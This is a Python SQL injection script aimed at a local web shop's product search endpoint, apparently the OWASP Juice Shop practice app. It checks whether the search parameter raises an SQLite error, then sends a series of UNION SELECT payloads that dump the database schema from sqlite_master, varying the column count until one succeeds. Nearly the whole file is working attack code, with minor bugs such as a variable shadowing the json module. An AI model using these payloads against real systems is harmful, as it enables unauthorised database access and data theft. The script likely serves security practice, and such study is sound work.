import requests
import random
import json

def main ():
    if not check_search_query():
        print("Search query is not injectable")

    union_based_attack()
    random_union_based_attack()
    # search query is injectable
    
def check_search_query():
    url = "http://localhost:3000/rest/products/search?q="

    # confirm we can reach the website
    try: 
        response = requests.get(url)

    except requests.exceptions.RequestException:
        print("Error occured while requesting " + url)
        return
    
    # test to see if it is injectable 
    url = "http://localhost:3000/rest/products/search?q=a\'"

    try:
        response = requests.get(url, headers={'Accept':'application/json'}) #as json
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        # print raw error
        print("Error",e.response.json())

    json = response.json()
    code = json['error']['code']
    print(code)
    if code == "SQLITE_ERROR":
        return True
    return False

def union_based_attack():
    url = "http://localhost:3000/rest/products/search?q=\')) UNION SELECT null, sql, null, null FROM sqlite_master--"
    
    try:
        response = requests.get(url, headers={'Accept': 'application/json'})
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print("Error", e.response.json())
        return

    json = response.json()
    print(json)


def random_union_based_attack():
    payloads = [
        "a\')) UNION SELECT null, sql, null, null FROM sqlite_master--",
        "a\')) UNION SELECT name, type, sql, null FROM sqlite_master--",
        "a\')) UNION SELECT null, null, null, null--",
        "a\')) UNION SELECT 1, 2, 3, 4;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9;--",
        "a\')) UNION SELECT sql, 2, 3, 4, 5, 6, 7, 8, 9 from sqlite_master;--" # this final one gives us the schema
    ]
    url = "http://localhost:3000/rest/products/search?q="
    for payload in payloads:
        
        full_url = url + payload

        print("testing payload: ", full_url)
        
        try:
            response = requests.get(full_url, headers={'Accept': 'application/json'})
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            print("Error", e.response.json())
            continue
        
        json = response.json()
        print_json_nicely(json)

def print_json_nicely(json_data):
    print(json.dumps(json_data, indent=4, sort_keys=True))


if __name__ == "__main__":
    main()

